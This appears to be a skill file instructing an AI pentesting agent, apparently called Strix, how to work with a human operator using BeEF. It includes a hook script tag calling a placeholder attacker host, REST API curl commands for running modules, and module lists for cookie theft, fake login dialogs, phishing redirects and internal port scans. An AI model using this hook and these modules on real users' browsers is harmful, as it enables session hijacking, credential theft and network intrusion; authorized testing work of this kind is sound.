---
name: beef
description: Operator-assisted BeEF workflows for browser exploitation, XSS hook management, and client-side attack delivery
category: tools
tags: [exploitation, xss, browser, client-side, operator-assisted]
---

# BeEF (Browser Exploitation Framework)

Browser exploitation framework that hooks browsers via XSS and delivers client-side attacks. Use when Strix confirms XSS vulnerabilities and impact needs to be demonstrated beyond alert boxes.

## When to Request

- After confirming a stored or reflected XSS vulnerability
- To demonstrate real-world XSS impact (session hijacking, keylogging, phishing)
- For client-side reconnaissance (browser, plugins, internal network)
- When chaining XSS with social engineering

## Operator-Assisted Workflow

1. Agent confirms XSS injection point via Strix proxy testing
2. Agent provides the BeEF hook script URL for the operator to inject
3. Operator starts BeEF server and injects hook into the XSS payload
4. Operator reports hooked browsers and available command modules
5. Agent directs which BeEF modules to execute based on assessment objectives

## Key Commands

### Start BeEF
```
beef-xss
# or
cd /usr/share/beef-xss && ./beef
```

### Hook Script (inject via XSS)
```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

### Useful Command Modules
```
# Browser fingerprinting
- Get Cookie
- Get System Info
- Detect Software (Java, Flash, etc.)

# Network discovery
- Get Internal IP (WebRTC)
- Port Scan (internal)
- Ping Sweep

# Credential harvesting
- Pretty Theft (fake login dialog)
- Simple Hijacker (redirect to phishing)
- Clippy (social engineering)

# Exploitation
- Redirect Browser
- Man-in-the-Browser
- Tab Nabbing
```

### REST API (Automated)
```
# List hooked browsers
curl http://ATTACKER_IP:3000/api/hooks?token=API_TOKEN

# Execute module
curl -X POST http://ATTACKER_IP:3000/api/modules/HOOK_ID/MODULE_ID?token=API_TOKEN -H "Content-Type: application/json" -d '{}'
```

## Output Analysis

- **Hooked browsers** -- confirms XSS impact with real browser compromise
- **Internal IPs** -- WebRTC leak reveals internal network topology
- **Credentials captured** -- from fake login dialogs or form grabbers
- **Port scan results** -- internal services reachable from the victim's browser
- **Browser/plugin info** -- identifies client-side attack surface

## Integration with Strix

- Strix identifies XSS vulnerabilities; BeEF demonstrates exploitability and impact
- Internal network discovery from hooked browsers expands assessment scope
- Captured credentials feed into authentication testing
- Session tokens captured via BeEF validate session hijacking impact
